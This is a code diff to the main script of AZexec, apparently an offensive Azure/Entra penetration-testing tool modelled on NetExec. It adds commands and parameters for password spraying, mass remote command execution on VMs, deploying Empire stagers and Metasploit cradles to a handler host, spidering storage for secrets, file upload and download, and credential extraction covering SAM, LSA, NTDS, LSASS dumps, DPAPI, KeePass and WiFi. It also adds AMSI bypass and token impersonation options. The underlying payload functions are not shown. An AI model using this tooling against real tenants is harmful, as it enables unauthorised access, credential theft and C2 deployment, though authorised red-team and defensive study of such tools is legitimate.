@@ -1,6 +1,6 @@
 <#
     This file is part of the toolkit EvilMist
-    Copyright (C) 2025 Logisek
+    Copyright (C) 2025-2026 Logisek
     https://github.com/Logisek/AZexec
 
     AZexec - The Azure Execution Tool.
@@ -172,6 +172,10 @@
     - local-groups: Enumerate Azure AD Administrative Units (mimics nxc smb --local-group) (authentication required)
     - av-enum: Enumerate Anti-Virus and EDR products on Azure/Entra devices (mimics nxc smb -M enum_av) (authentication required)
     - process-enum: Enumerate remote processes on Azure VMs (mimics nxc smb --tasklist) (multi-subscription support)
+    - lockscreen-enum: Detect accessibility backdoors on Azure VMs (mimics nxc smb -M lockscreendoors) (multi-subscription support)
+    - intune-enum: Enumerate Intune/Endpoint Manager configuration (mimics nxc smb -M sccm-recon6) (authentication required)
+    - delegation-enum: Enumerate OAuth2 delegation/impersonation paths (mimics nxc smb --delegate) (authentication required)
+    - exec: Execute remote commands on Azure VMs (mimics nxc smb -x/-X) (multi-subscription support)
 
 .PARAMETER Domain
     Domain name or tenant ID for tenant discovery. If not provided, the tool will attempt
@@ -629,9 +633,65 @@
     .\azx.ps1 process-enum -SubscriptionId "12345678-1234-1234-1234-123456789012" -ProcessName "python"
     Enumerate Python processes in a specific subscription
 
+.EXAMPLE
+    .\azx.ps1 lockscreen-enum
+    Detect lockscreen backdoors on all Azure VMs (similar to nxc smb -M lockscreendoors)
+
+.EXAMPLE
+    .\azx.ps1 lockscreen-enum -VMFilter running
+    Check only running VMs for accessibility backdoors
+
+.EXAMPLE
+    .\azx.ps1 lockscreen-enum -ResourceGroup Production-RG -ExportPath lockscreen-report.html
+    Check VMs in specific resource group and export HTML report
+
+.EXAMPLE
+    .\azx.ps1 intune-enum
+    Enumerate Intune/Endpoint Manager configuration (similar to nxc smb -M sccm-recon6)
+
+.EXAMPLE
+    .\azx.ps1 intune-enum -ExportPath intune-report.csv
+    Enumerate Intune configuration and export to CSV
+
+.EXAMPLE
+    .\azx.ps1 intune-enum -ExportPath intune-report.html
+    Enumerate Intune configuration and generate HTML report
+
+.EXAMPLE
+    .\azx.ps1 delegation-enum
+    Enumerate OAuth2 delegated permissions and identify impersonation paths (Azure equivalent of nxc smb --delegate)
+
+.EXAMPLE
+    .\azx.ps1 delegation-enum -ExportPath delegation.csv
+    Enumerate OAuth2 delegation and export to CSV
+
+.EXAMPLE
+    .\azx.ps1 delegation-enum -ExportPath delegation.json
+    Enumerate OAuth2 delegation with full details exported to JSON
+
+.EXAMPLE
+    .\azx.ps1 exec -VMName "vm-web-01" -x "whoami"
+    Execute shell command on single VM (like nxc smb -x)
+
+.EXAMPLE
+    .\azx.ps1 exec -VMName "vm-web-01" -x '$env:COMPUTERNAME' -PowerShell
+    Execute PowerShell on single VM (like nxc smb -X)
+
+.EXAMPLE
+    .\azx.ps1 exec -ResourceGroup "Production-RG" -x "hostname" -AllVMs
+    Execute on all VMs in resource group (requires -AllVMs flag)
+
+.EXAMPLE
+    .\azx.ps1 exec -VMName "arc-server-01" -x "id" -ExecMethod arc
+    Force specific execution method (Arc-enabled server)
+
+.EXAMPLE
+    .\azx.ps1 exec -x "whoami /all" -AllVMs -ExportPath results.csv
+    Execute across all subscriptions with export
+
 .NOTES
     Requires PowerShell 7+
-    Requires Microsoft.Graph PowerShell module (for 'hosts', 'groups', 'local-groups', 'pass-pol', 'sessions', 'vuln-list', 'guest-vuln-scan', 'apps', 'sp-discovery', 'roles', 'ca-policies' commands)
+    Requires Microsoft.Graph PowerShell module (for 'hosts', 'groups', 'local-groups', 'pass-pol', 'sessions', 'vuln-list', 'guest-vuln-scan', 'apps', 'sp-discovery', 'roles', 'ca-policies', 'intune-enum' commands)
     Requires Az PowerShell module (for ARM-based commands: 'vm-loggedon', 'storage-enum', 'keyvault-enum', 'network-enum', 'shares-enum')
     Requires appropriate Azure/Entra permissions (for authenticated commands)
     The 'tenant' and 'users' commands do not require authentication
@@ -654,13 +714,26 @@
     - 'disks-enum': Requires Az.Accounts, Az.Resources, Az.Compute (Reader role required)
     - 'bitlocker-enum': Requires Az.Accounts, Az.Compute, Az.Resources (VM Contributor or VM Command Executor role required)
     - 'process-enum': Requires Az.Accounts, Az.Compute, Az.Resources (VM Contributor or VM Command Executor role required)
-    
+    - 'lockscreen-enum': Requires Az.Accounts, Az.Compute, Az.Resources (VM Contributor or VM Command Executor role required)
+    - 'exec': Requires Az.Accounts, Az.Compute, Az.Resources (VM Contributor or VM Command Executor role required)
+
     The 'shares-enum' command is the Azure equivalent of NetExec's --shares command for SMB share enumeration
     The 'disks-enum' command is the Azure equivalent of NetExec's --disks command for disk enumeration
     The 'bitlocker-enum' command is the Azure equivalent of NetExec's -M bitlocker module for BitLocker encryption status
     The 'av-enum' command is the Azure equivalent of NetExec's -M enum_av module for antivirus/EDR enumeration
     The 'process-enum' command is the Azure equivalent of NetExec's --tasklist command for remote process enumeration
-    
+    The 'lockscreen-enum' command is the Azure equivalent of NetExec's -M lockscreendoors module for detecting accessibility backdoors
+    The 'intune-enum' command is the Azure equivalent of NetExec's -M sccm-recon6 module for SCCM/Intune infrastructure reconnaissance
+    The 'intune-enum' command requires DeviceManagementConfiguration.Read.All, DeviceManagementRBAC.Read.All, and DeviceManagementManagedDevices.Read.All permissions
+    The 'delegation-enum' command requires Application.Read.All and Directory.Read.All permissions (Azure equivalent of NetExec --delegate)
+    The 'exec' command is the Azure equivalent of NetExec's -x/-X remote command execution
+    The 'exec' command supports six methods:
+    - vmrun: Azure VM Run Command (synchronous - for Azure VMs)
+    - arc: Azure Arc Run Command (synchronous - for Arc-enabled servers)
+    - mde: MDE Live Response (async with polling - for MDE-enrolled devices)
+    - intune: Intune Proactive Remediation (async - for Intune-managed devices)
+    - automation: Azure Automation Hybrid Worker (job-based - for servers with Automation extension)
+
     All ARM-based commands support multi-subscription enumeration:
     - By default, all accessible subscriptions are enumerated automatically
     - Use -SubscriptionId to target a specific subscription
@@ -672,7 +745,7 @@
 [CmdletBinding()]
 param(
     [Parameter(Mandatory = $true, Position = 0)]
-    [ValidateSet("hosts", "tenant", "users", "user-profiles", "rid-brute", "groups", "pass-pol", "guest", "vuln-list", "sessions", "guest-vuln-scan", "apps", "sp-discovery", "roles", "ca-policies", "vm-loggedon", "storage-enum", "keyvault-enum", "network-enum", "shares-enum", "disks-enum", "bitlocker-enum", "local-groups", "av-enum", "process-enum", "help")]
+    [ValidateSet("hosts", "tenant", "users", "user-profiles", "rid-brute", "groups", "pass-pol", "guest", "spray", "vuln-list", "sessions", "guest-vuln-scan", "apps", "sp-discovery", "roles", "ca-policies", "vm-loggedon", "storage-enum", "keyvault-enum", "network-enum", "shares-enum", "disks-enum", "bitlocker-enum", "local-groups", "av-enum", "process-enum", "lockscreen-enum", "intune-enum", "delegation-enum", "exec", "empire-exec", "met-inject", "spider", "get-file", "put-file", "creds", "help")]
     [string]$Command,
     
     [Parameter(Mandatory = $false)]
@@ -730,7 +803,209 @@ param(
     [string]$SharesFilter = "all",
     
     [Parameter(Mandatory = $false)]
-    [string]$ProcessName
+    [string]$ProcessName,
+
+    # Password spray options (NetExec-style)
+    [Parameter(Mandatory = $false)]
+    [switch]$ContinueOnSuccess,
+
+    [Parameter(Mandatory = $false)]
+    [switch]$NoBruteforce,
+
+    [Parameter(Mandatory = $false)]
+    [string]$PasswordFile,
+
+    [Parameter(Mandatory = $false)]
+    [int]$Delay = 0,
+
+    # Token-based authentication (Azure's Pass-the-Hash equivalent)
+    [Parameter(Mandatory = $false)]
+    [string]$AccessToken,
+
+    # Local authentication mode (Azure equivalent of netexec --local-auth)
+    # Only spray managed (cloud-only) domains, skip federated domains
+    [Parameter(Mandatory = $false)]
+    [switch]$LocalAuth,
+
+    # Remote command execution options (exec command - NetExec -x/-X equivalent)
+    [Parameter(Mandatory = $false)]
+    [string]$x,                    # Command to execute (-x shell mode)
+
+    [Parameter(Mandatory = $false)]
+    [string]$VMName,               # Target VM name for single-target execution
+
+    [Parameter(Mandatory = $false)]
+    [ValidateSet("auto", "vmrun", "arc", "mde", "intune", "automation", "pi")]
+    [string]$ExecMethod = "auto",  # Execution method selection
+
+    [Parameter(Mandatory = $false)]
+    [switch]$PowerShell,           # For PowerShell execution (use -PowerShell instead of -X due to case insensitivity)
+
+    [Parameter(Mandatory = $false)]
+    [switch]$AllVMs,               # Execute on all matching VMs (explicit opt-in)
+
+    [Parameter(Mandatory = $false)]
+    [string]$DeviceName,           # Target device name (Arc or Intune)
+
+    [Parameter(Mandatory = $false)]
+    [switch]$AllDevices,           # Execute on all Arc-enabled devices
+
+    [Parameter(Mandatory = $false)]
+    [int]$Timeout = 300,           # Command execution timeout in seconds
+
+    [Parameter(Mandatory = $false)]
+    [string]$AmsiBypass,           # Path to AMSI bypass script file (PowerShell only)
+
+    # Process injection parameters (exec command only - Azure equivalent of NetExec pi module)
+    [Parameter(Mandatory = $false)]
+    [int]$TargetPID,               # Target process ID for token duplication
+
+    [Parameter(Mandatory = $false)]
+    [string]$TargetUser,            # Target user to impersonate (finds their process automatically)
+
+    # Empire execution options (empire-exec command - NetExec -M empire_exec equivalent)
+    [Parameter(Mandatory = $false)]
+    [string]$Listener,             # Empire listener name
+
+    [Parameter(Mandatory = $false)]
+    [string]$EmpireHost,           # Empire server hostname/IP
+
+    [Parameter(Mandatory = $false)]
+    [int]$EmpirePort = 1337,       # Empire API port
+
+    [Parameter(Mandatory = $false)]
+    [string]$EmpireUsername,       # Empire API username
+
+    [Parameter(Mandatory = $false)]
+    [string]$EmpirePassword,       # Empire API password
+
+    [Parameter(Mandatory = $false)]
+    [string]$EmpireConfigFile,     # Path to Empire config file (JSON)
+
+    [Parameter(Mandatory = $false)]
+    [switch]$Obfuscate,            # Enable stager obfuscation
+
+    [Parameter(Mandatory = $false)]
+    [string]$ObfuscateCommand,     # Obfuscation options (default: Token,All,1)
+
+    # Metasploit injection options (met-inject command - NetExec -M met_inject equivalent)
+    [Parameter(Mandatory = $false)]
+    [string]$SRVHOST,              # Metasploit handler host
+
+    [Parameter(Mandatory = $false)]
+    [int]$SRVPORT,                 # Metasploit handler port
+
+    [Parameter(Mandatory = $false)]
+    [string]$RAND,                 # Random URI path for payload
+
+    # Note: $SSL switch already exists for guest command, reused for empire/met SSL
+    [Parameter(Mandatory = $false)]
+    [string]$ProxyHost,            # Proxy host for met_inject
+
+    [Parameter(Mandatory = $false)]
+    [int]$ProxyPort,               # Proxy port for met_inject
+
+    # Spider options (spider command - NetExec spider/spider_plus equivalent)
+    [Parameter(Mandatory = $false)]
+    [string]$Pattern,              # File extension filter (e.g., "txt,docx,key,pem,pfx,config")
+
+    [Parameter(Mandatory = $false)]
+    [switch]$Download,             # Enable file downloading
+
+    [Parameter(Mandatory = $false)]
+    [int]$MaxFileSize = 10,        # Max file size in MB (default: 10)
+
+    [Parameter(Mandatory = $false)]
+    [string]$OutputFolder = ".\SpiderLoot",  # Download destination
+
+    [Parameter(Mandatory = $false)]
+    [int]$Depth = 10,              # Max recursion depth
+
+    [Parameter(Mandatory = $false)]
+    [switch]$BlobsOnly,            # Only spider blob containers
+
+    [Parameter(Mandatory = $false)]
+    [switch]$SharesOnly,           # Only spider file shares
+
+    [Parameter(Mandatory = $false)]
+    [string]$StorageAccountTarget, # Target specific storage account (renamed to avoid conflict)
+
+    [Parameter(Mandatory = $false)]
+    [string]$ContainerTarget,      # Target specific container/share (renamed to avoid conflict)
+
+    # NEW: VM/Device Spider options (spider command extension)
+    [Parameter(Mandatory = $false)]
+    [string]$StartPath,            # Starting directory for VM/Device spider (default: C:\ on Windows, / on Linux)
+
+    [Parameter(Mandatory = $false)]
+    [string]$ExcludePaths,         # Comma-separated paths to exclude from spider
+
+    [Parameter(Mandatory = $false)]
+    [switch]$StorageOnly,          # Only spider Azure Storage (default if no VM/Device params)
+
+    [Parameter(Mandatory = $false)]
+    [switch]$VMsOnly,              # Only spider VMs
+
+    [Parameter(Mandatory = $false)]
+    [switch]$DevicesOnly,          # Only spider Arc/MDE/Intune devices
+
+    # File transfer options (get-file/put-file commands - NetExec --get-file/--put-file equivalent)
+    [Parameter(Mandatory = $false)]
+    [string]$LocalPath,            # Local file path for get-file/put-file
+
+    [Parameter(Mandatory = $false)]
+    [string]$RemotePath,           # Remote file path for get-file/put-file
+
+    # Credential extraction options (creds command - NetExec --sam/--lsa/--ntds equivalent)
+    [Parameter(Mandatory = $false)]
+    [ValidateSet("auto", "sam", "tokens", "dpapi", "lsa", "ntds", "lsass", "backup", "sccm", "wam", "wifi", "putty", "notepad", "notepadpp", "keepass_discover", "keepass_trigger", "rdcman", "eventlog_creds", "winscp", "vnc", "mremoteng", "veeam", "all")]
+    [string]$CredMethod = "auto",  # Extraction method: auto, sam, tokens, dpapi, lsa, ntds, lsass, backup, sccm, wam, wifi, putty, notepad, notepadpp, keepass_discover, keepass_trigger, rdcman, eventlog_creds, winscp, vnc, mremoteng, veeam, all
+
+    [Parameter(Mandatory = $false)]
+    [switch]$HashcatFormat,        # Output hashes in hashcat format
+
+    [Parameter(Mandatory = $false)]
+    [switch]$JohnFormat,           # Output hashes in John the Ripper format
+
+    # NTDS-specific options (creds command)
+    [Parameter(Mandatory = $false)]
+    [ValidateSet("vss", "ntdsutil", "drsuapi")]
+    [string]$NTDSMethod = "vss",   # NTDS extraction method: vss, ntdsutil, drsuapi
+
+    # LSASS-specific options (creds command)
+    [Parameter(Mandatory = $false)]
+    [ValidateSet("comsvcs", "procdump", "nanodump", "direct")]
+    [string]$LsassMethod = "comsvcs",  # LSASS dump method: comsvcs, procdump, nanodump, direct
+
+    # SCCM-specific options (creds command)
+    [Parameter(Mandatory = $false)]
+    [ValidateSet("disk", "api")]
+    [string]$SCCMMethod = "disk",  # SCCM extraction method: disk, api
+
+    # NTDS filtering options (creds command)
+    [Parameter(Mandatory = $false)]
+    [switch]$EnabledOnly,          # Only extract enabled accounts (NTDS)
+
+    [Parameter(Mandatory = $false)]
+    [string]$TargetDomainUser,     # Target specific domain user (NTDS)
+
+    # WAM DPAPI decryption support (creds command)
+    [Parameter(Mandatory = $false)]
+    [string]$PVKFile,              # DPAPI PVK file for WAM token decryption
+
+    [Parameter(Mandatory = $false)]
+    [string]$MasterKeyFile,        # DPAPI master key file for WAM token decryption
+
+    # KeePass trigger options (creds command - keepass_trigger method)
+    [Parameter(Mandatory = $false)]
+    [string]$KeePassConfigPath,    # Path to KeePass.config.xml
+
+    [Parameter(Mandatory = $false)]
+    [ValidateSet("add", "check", "restart", "poll", "clean", "all")]
+    [string]$KeePassAction = "all",  # KeePass trigger action: add, check, restart, poll, clean, all
+
+    [Parameter(Mandatory = $false)]
+    [string]$KeePassExportPath     # Path for KeePass export file
 )
 
 
@@ -759,6 +1034,13 @@ $FunctionsPath = Join-Path $PSScriptRoot "Functions"
 . "$FunctionsPath\Vulnerabilities.ps1"
 . "$FunctionsPath\Security.ps1"
 . "$FunctionsPath\AzureRM.ps1"
+. "$FunctionsPath\Intune.ps1"
+. "$FunctionsPath\Delegation.ps1"
+. "$FunctionsPath\CommandExecution.ps1"
+. "$FunctionsPath\ShellGeneration.ps1"
+. "$FunctionsPath\Spider.ps1"
+. "$FunctionsPath\FileTransfer.ps1"
+. "$FunctionsPath\CredentialExtraction.ps1"
 
 # ============================================
 # MAIN EXECUTION
@@ -770,9 +1052,51 @@ Show-Banner
 # For authenticated commands (hosts, groups, pass-pol, sessions), we need Graph module
 # vuln-list handles authentication internally (hybrid unauthenticated + authenticated)
 # rid-brute is an alias for user-profiles (Azure equivalent of RID bruteforcing)
-if ($Command -in @("hosts", "groups", "pass-pol", "sessions", "user-profiles", "rid-brute", "roles", "apps", "sp-discovery", "ca-policies", "local-groups")) {
-    Initialize-GraphModule
-    
+if ($Command -in @("hosts", "groups", "pass-pol", "sessions", "user-profiles", "rid-brute", "roles", "apps", "sp-discovery", "ca-policies", "local-groups", "intune-enum", "delegation-enum")) {
+    # Determine required Graph modules based on command
+    $graphModules = switch ($Command) {
+        "hosts" {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.Identity.DirectoryManagement")
+        }
+        { $_ -in @("user-profiles", "rid-brute") } {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.Users")
+        }
+        "groups" {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.Groups")
+        }
+        "pass-pol" {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.Identity.DirectoryManagement")
+        }
+        "sessions" {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.Reports")
+        }
+        "roles" {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.Identity.DirectoryManagement")
+        }
+        "apps" {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.Applications")
+        }
+        "sp-discovery" {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.Applications")
+        }
+        "ca-policies" {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.Identity.SignIns")
+        }
+        "local-groups" {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.Identity.DirectoryManagement")
+        }
+        "intune-enum" {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.DeviceManagement", "Microsoft.Graph.DeviceManagement.Administration")
+        }
+        "delegation-enum" {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.Applications")
+        }
+        default {
+            @("Microsoft.Graph.Authentication", "Microsoft.Graph.Identity.DirectoryManagement")
+        }
+    }
+    Initialize-GraphModule -RequiredModules $graphModules
+
     # Determine required scopes based on command
     $requiredScopes = switch ($Command) {
         "hosts" { "Device.Read.All" }
@@ -786,44 +1110,48 @@ if ($Command -in @("hosts", "groups", "pass-pol", "sessions", "user-profiles", "
         "apps" { "Application.Read.All,Directory.Read.All" }
         "ca-policies" { "Policy.Read.All,Directory.Read.All" }
         "local-groups" { "AdministrativeUnit.Read.All,Directory.Read.All" }
-        "sp-discovery" { 
+        "sp-discovery" {
             if ($IncludeWritePermissions) {
                 "Application.Read.All,Directory.Read.All,AppRoleAssignment.ReadWrite.All"
             } else {
                 "Application.Read.All,Directory.Read.All"
             }
         }
+        "intune-enum" { "DeviceManagementConfiguration.Read.All,DeviceManagementRBAC.Read.All,DeviceManagementManagedDevices.Read.All,DeviceManagementServiceConfig.Read.All" }
+        "delegation-enum" { "Application.Read.All,Directory.Read.All" }
         default { $Scopes }
     }
-    
+
     Connect-GraphAPI -Scopes $requiredScopes
 }
 
 # vuln-list, guest-vuln-scan, and av-enum require Graph module but handle connection internally
 if ($Command -eq "vuln-list" -or $Command -eq "guest-vuln-scan") {
-    Initialize-GraphModule
+    $graphModules = @("Microsoft.Graph.Authentication", "Microsoft.Graph.Identity.DirectoryManagement", "Microsoft.Graph.Users", "Microsoft.Graph.Groups", "Microsoft.Graph.Applications")
+    Initialize-GraphModule -RequiredModules $graphModules
 }
 
 # av-enum requires Graph module with specific permissions
 if ($Command -eq "av-enum") {
-    Initialize-GraphModule
-    
+    $graphModules = @("Microsoft.Graph.Authentication", "Microsoft.Graph.Identity.DirectoryManagement", "Microsoft.Graph.DeviceManagement")
+    Initialize-GraphModule -RequiredModules $graphModules
+
     # av-enum needs Device.Read.All at minimum, plus MDE/Intune permissions for full data
     # DeviceManagementConfiguration.Read.All is needed for some encryption/compliance data
     $requiredScopes = "Device.Read.All,SecurityEvents.Read.All,DeviceManagementManagedDevices.Read.All,DeviceManagementConfiguration.Read.All"
-    
+
     Write-ColorOutput -Message "`n[*] Connecting to Microsoft Graph for Security Enumeration..." -Color "Yellow"
     Write-ColorOutput -Message "[*] Permissions requested (some require admin consent):" -Color "Cyan"
     Write-ColorOutput -Message "    • Device.Read.All (required - device enumeration)" -Color "White"
     Write-ColorOutput -Message "    • DeviceManagementManagedDevices.Read.All (Intune device data, BitLocker status)" -Color "White"
     Write-ColorOutput -Message "    • DeviceManagementConfiguration.Read.All (device compliance, encryption policies)" -Color "White"
     Write-ColorOutput -Message "    • SecurityEvents.Read.All (MDE/Defender status - requires admin consent)`n" -Color "Gray"
-    
+
     Connect-GraphAPI -Scopes $requiredScopes
 }
 
 # ARM-based commands use Azure Resource Manager (Az modules) with RBAC, not Graph API
-if ($Command -in @("vm-loggedon", "storage-enum", "keyvault-enum", "network-enum", "shares-enum", "disks-enum", "bitlocker-enum", "process-enum")) {
+if ($Command -in @("vm-loggedon", "storage-enum", "keyvault-enum", "network-enum", "shares-enum", "disks-enum", "bitlocker-enum", "process-enum", "lockscreen-enum", "exec", "empire-exec", "met-inject", "spider", "get-file", "put-file", "creds")) {
     Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
     Write-ColorOutput -Message "[*] AZURE RESOURCE MANAGER - RBAC REQUIREMENTS" -Color "Cyan"
     Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
@@ -882,8 +1210,108 @@ if ($Command -in @("vm-loggedon", "storage-enum", "keyvault-enum", "network-enum
             Write-ColorOutput -Message "    Option 2 (Common - Full VM Access):" -Color "White"
             Write-ColorOutput -Message "      • Virtual Machine Contributor role`n" -Color "Gray"
         }
+        "lockscreen-enum" {
+            Write-ColorOutput -Message "[*] Required Azure RBAC Roles for Lockscreen Backdoor Enumeration:`n" -Color "Yellow"
+            Write-ColorOutput -Message "    Option 1 (Recommended - Minimal Permissions):" -Color "White"
+            Write-ColorOutput -Message "      • Reader role (to list VMs)" -Color "Gray"
+            Write-ColorOutput -Message "      • Virtual Machine Command Executor role (to query accessibility executables)`n" -Color "Gray"
+            Write-ColorOutput -Message "    Option 2 (Common - Full VM Access):" -Color "White"
+            Write-ColorOutput -Message "      • Virtual Machine Contributor role`n" -Color "Gray"
+        }
+        "exec" {
+            Write-ColorOutput -Message "[*] Required Azure RBAC Roles for Remote Command Execution:`n" -Color "Yellow"
+            Write-ColorOutput -Message "    VM Run Command (vmrun):" -Color "White"
+            Write-ColorOutput -Message "      • Reader role (to list VMs)" -Color "Gray"
+            Write-ColorOutput -Message "      • Virtual Machine Command Executor role (to execute commands)`n" -Color "Gray"
+            Write-ColorOutput -Message "    Arc Run Command (arc):" -Color "White"
+            Write-ColorOutput -Message "      • Azure Connected Machine Resource Administrator`n" -Color "Gray"
+            Write-ColorOutput -Message "    MDE Live Response (mde):" -Color "White"
+            Write-ColorOutput -Message "      • Machine.LiveResponse permission (Security API)" -Color "Gray"
+            Write-ColorOutput -Message "      • Machine.Read.All permission`n" -Color "Gray"
+            Write-ColorOutput -Message "    Intune Proactive Remediation (intune):" -Color "White"
+            Write-ColorOutput -Message "      • DeviceManagementManagedDevices.PrivilegedOperations.All`n" -Color "Gray"
+            Write-ColorOutput -Message "    Azure Automation (automation):" -Color "White"
+            Write-ColorOutput -Message "      • Automation Contributor role`n" -Color "Gray"
+        }
+        "empire-exec" {
+            Write-ColorOutput -Message "[*] Required Azure RBAC Roles for Empire Execution:`n" -Color "Yellow"
+            Write-ColorOutput -Message "    Same as 'exec' command - deploys Empire stager via Azure execution methods" -Color "White"
+            Write-ColorOutput -Message "    VM Run Command: Reader + Virtual Machine Command Executor" -Color "Gray"
+            Write-ColorOutput -Message "    Arc Run Command: Azure Connected Machine Resource Administrator`n" -Color "Gray"
+            Write-ColorOutput -Message "    Additional Requirements:" -Color "White"
+            Write-ColorOutput -Message "      • Empire C2 server running with REST API enabled" -Color "Gray"
+            Write-ColorOutput -Message "      • Valid Empire listener configured`n" -Color "Gray"
+        }
+        "met-inject" {
+            Write-ColorOutput -Message "[*] Required Azure RBAC Roles for Metasploit Injection:`n" -Color "Yellow"
+            Write-ColorOutput -Message "    Same as 'exec' command - deploys Metasploit cradle via Azure execution methods" -Color "White"
+            Write-ColorOutput -Message "    VM Run Command: Reader + Virtual Machine Command Executor" -Color "Gray"
+            Write-ColorOutput -Message "    Arc Run Command: Azure Connected Machine Resource Administrator`n" -Color "Gray"
+            Write-ColorOutput -Message "    Additional Requirements:" -Color "White"
+            Write-ColorOutput -Message "      • Metasploit handler running (exploit/multi/script/web_delivery)" -Color "Gray"
+            Write-ColorOutput -Message "      • Network connectivity from target to handler`n" -Color "Gray"
+        }
+        "spider" {
+            Write-ColorOutput -Message "[*] Required Azure RBAC Roles for Spider Command:`n" -Color "Yellow"
+            Write-ColorOutput -Message "  Storage Spider (default):" -Color "White"
+            Write-ColorOutput -Message "    Minimum: Reader + Storage Account Key Operator Service Role" -Color "Gray"
+            Write-ColorOutput -Message "    Recommended: Storage Blob Data Reader + Storage File Data SMB Share Reader`n" -Color "Gray"
+            Write-ColorOutput -Message "  VM Spider (-VMName, -AllVMs):" -Color "White"
+            Write-ColorOutput -Message "    Reader + Virtual Machine Command Executor role" -Color "Gray"
+            Write-ColorOutput -Message "    Or: Virtual Machine Contributor role`n" -Color "Gray"
+            Write-ColorOutput -Message "  Device Spider (-DeviceName, -AllDevices):" -Color "White"
+            Write-ColorOutput -Message "    Arc: Azure Connected Machine Resource Administrator" -Color "Gray"
+            Write-ColorOutput -Message "    MDE: Machine.LiveResponse, Machine.Read.All" -Color "Gray"
+            Write-ColorOutput -Message "    Intune: DeviceManagementManagedDevices.PrivilegedOperations.All`n" -Color "Gray"
+        }
+        "get-file" {
+            Write-ColorOutput -Message "[*] Required Azure RBAC Roles for File Download:`n" -Color "Yellow"
+            Write-ColorOutput -Message "  Blob Storage:" -Color "White"
+            Write-ColorOutput -Message "    Storage Blob Data Reader (or Contributor)`n" -Color "Gray"
+            Write-ColorOutput -Message "  File Shares:" -Color "White"
+            Write-ColorOutput -Message "    Storage File Data SMB Share Reader (or Contributor)`n" -Color "Gray"
+            Write-ColorOutput -Message "  Azure VMs:" -Color "White"
+            Write-ColorOutput -Message "    Reader + Virtual Machine Command Executor role" -Color "Gray"
+            Write-ColorOutput -Message "    Or: Virtual Machine Contributor role`n" -Color "Gray"
+            Write-ColorOutput -Message "  Arc Devices:" -Color "White"
+            Write-ColorOutput -Message "    Azure Connected Machine Resource Administrator`n" -Color "Gray"
+        }
+        "put-file" {
+            Write-ColorOutput -Message "[*] Required Azure RBAC Roles for File Upload:`n" -Color "Yellow"
+            Write-ColorOutput -Message "  Blob Storage:" -Color "White"
+            Write-ColorOutput -Message "    Storage Blob Data Contributor`n" -Color "Gray"
+            Write-ColorOutput -Message "  File Shares:" -Color "White"
+            Write-ColorOutput -Message "    Storage File Data SMB Share Contributor`n" -Color "Gray"
+            Write-ColorOutput -Message "  Azure VMs:" -Color "White"
+            Write-ColorOutput -Message "    Reader + Virtual Machine Command Executor role" -Color "Gray"
+            Write-ColorOutput -Message "    Or: Virtual Machine Contributor role`n" -Color "Gray"
+            Write-ColorOutput -Message "  Arc Devices:" -Color "White"
+            Write-ColorOutput -Message "    Azure Connected Machine Resource Administrator`n" -Color "Gray"
+        }
+        "creds" {
+            Write-ColorOutput -Message "[*] Required Azure RBAC Roles for Credential Extraction:`n" -Color "Yellow"
+            Write-ColorOutput -Message "  Azure VMs (SAM/LSA/DPAPI/LSASS/Backup/SCCM/WAM extraction):" -Color "White"
+            Write-ColorOutput -Message "    Reader + Virtual Machine Command Executor role" -Color "Gray"
+            Write-ColorOutput -Message "    Or: Virtual Machine Contributor role`n" -Color "Gray"
+            Write-ColorOutput -Message "  Azure VMs (Token extraction):" -Color "White"
+            Write-ColorOutput -Message "    Reader + Virtual Machine Command Executor role" -Color "Gray"
+            Write-ColorOutput -Message "    Target VM must have Managed Identity configured`n" -Color "Gray"
+            Write-ColorOutput -Message "  Azure VMs (NTDS extraction - DC only):" -Color "White"
+            Write-ColorOutput -Message "    Target must be a Domain Controller (NTDS service running)" -Color "Gray"
+            Write-ColorOutput -Message "    drsuapi method requires DSInternals module on target`n" -Color "Gray"
+            Write-ColorOutput -Message "  Arc Devices:" -Color "White"
+            Write-ColorOutput -Message "    Azure Connected Machine Resource Administrator`n" -Color "Gray"
+            Write-ColorOutput -Message "  MDE Devices:" -Color "White"
+            Write-ColorOutput -Message "    Machine.LiveResponse + Machine.Read.All`n" -Color "Gray"
+            Write-ColorOutput -Message "  Intune Devices:" -Color "White"
+            Write-ColorOutput -Message "    DeviceManagementManagedDevices.PrivilegedOperations.All`n" -Color "Gray"
+            Write-ColorOutput -Message "  External Tools (local - for offline parsing):" -Color "White"
+            Write-ColorOutput -Message "    secretsdump.py (Impacket) - for SAM/LSA/NTDS hash extraction" -Color "Gray"
+            Write-ColorOutput -Message "    pypykatz - for LSASS dump parsing" -Color "Gray"
+            Write-ColorOutput -Message "    DSInternals - for NTDS drsuapi method (on target DC)`n" -Color "Gray"
+        }
     }
-    
+
     Write-ColorOutput -Message "[*] Role assignment scope: Subscription or Resource Group level" -Color "Yellow"
     Write-ColorOutput -Message "[*] If you lack permissions, the authentication will succeed but enumeration may fail`n" -Color "Yellow"
     
@@ -918,7 +1346,10 @@ switch ($Command) {
         Invoke-PasswordPolicyEnumeration -ExportPath $ExportPath
     }
     "guest" {
-        Invoke-GuestEnumeration -Domain $Domain -Username $Username -Password $Password -UserFile $UserFile -ExportPath $ExportPath
+        Invoke-GuestEnumeration -Domain $Domain -Username $Username -Password $Password -UserFile $UserFile -PasswordFile $PasswordFile -ContinueOnSuccess $ContinueOnSuccess -NoBruteforce $NoBruteforce -Delay $Delay -ExportPath $ExportPath -AccessToken $AccessToken -LocalAuth $LocalAuth
+    }
+    "spray" {
+        Invoke-PasswordSpray -Domain $Domain -UserFile $UserFile -Password $Password -PasswordFile $PasswordFile -ContinueOnSuccess $ContinueOnSuccess -NoBruteforce $NoBruteforce -Delay $Delay -ExportPath $ExportPath -LocalAuth $LocalAuth
     }
     "vuln-list" {
         Invoke-VulnListEnumeration -Domain $Domain -ExportPath $ExportPath
@@ -965,18 +1396,198 @@ switch ($Command) {
     "process-enum" {
